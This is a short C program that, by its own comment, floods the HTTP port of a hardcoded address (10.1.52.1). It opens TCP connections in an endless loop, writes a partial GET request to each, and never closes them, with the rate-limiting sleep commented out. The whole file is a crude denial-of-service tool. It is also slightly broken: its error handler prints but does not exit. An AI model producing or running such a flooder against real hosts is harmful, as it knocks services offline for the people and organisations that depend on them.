#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <netinet/ip.h>
#define __FAVOR_BSD	/* use bsd'ish tcp header */
#include <netinet/tcp.h>
#include <unistd.h>
#include <netdb.h>
#define P 80		/* flood the http port */

int main()
{
  int c, s;
  struct hostent *h;                             /* info about server */
  struct sockaddr_in channel;                    /* holds IP address */
  char addr[50];
  int port;
  char str[200];	
int ch=0;
    
    strcpy(addr,"10.1.52.1");
    port=P;
    	
	while(1)
	{
	  h = gethostbyname(addr);                    /* look up host's IP address */
      if (!h) fatal("gethostbyname failed");
 
   	
  	  s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
   	  if (s <0) fatal("socket");
     
   	  memset(&channel, 0, sizeof(channel));
   	  channel.sin_family= AF_INET;
   	  memcpy(&channel.sin_addr.s_addr, h->h_addr, h->h_length);
   	  channel.sin_port= htons(port);
 
 	  c = connect(s, (struct sockaddr *) &channel, sizeof(channel));
  	  if (c < 0) fatal("connect failed");	
	
	
      strcpy(str,"GET http://10.1.52.1");
      write(s,str, strlen(str));
	ch++;
        //if(ch%100)
        //sleep(10);
          
	  
	}
}	
fatal(char *string)
{printf("%s\n", string);}

